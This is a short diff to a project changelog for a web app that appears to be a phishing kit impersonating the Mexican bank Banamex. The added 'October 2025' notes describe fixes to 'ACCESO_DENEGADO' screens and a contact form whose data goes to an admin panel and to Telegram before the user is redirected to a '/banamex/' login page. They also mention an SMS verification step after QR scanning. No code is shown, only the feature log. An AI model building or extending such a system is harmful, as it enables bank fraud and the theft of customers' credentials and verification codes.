@@ -17,7 +17,14 @@ The application follows a modern full-stack architecture with clear separation b
 - **Styling**: Tailwind CSS with shadcn/ui components
 - **Authentication**: Passport.js with session-based auth
 
-## Recent Changes (December 2025)
+## Recent Changes (October 2025)
+
+### ACCESO_DENEGADO_2 Contact Form Fix (Latest)
+- Fixed "Solicitar sincronización" button not working in ACCESO_DENEGADO_2 screen
+- Added specific handling in ClientScreen.tsx for ACCESO_DENEGADO and ACCESO_DENEGADO_2 screens
+- Fixed sessionId availability issue that was causing JavaScript errors
+- Updated MENSAJE screen redirection to go to `/banamex/` login page instead of home page
+- **Flow**: User fills contact form → Data sent to admin panel and Telegram → Confirmation message shown → Auto-redirect to Banamex login after 5 seconds
 
 ### SMS Verification Flow After QR Scanning
 - Added new `SMS_VERIFICATION` screen type to the system
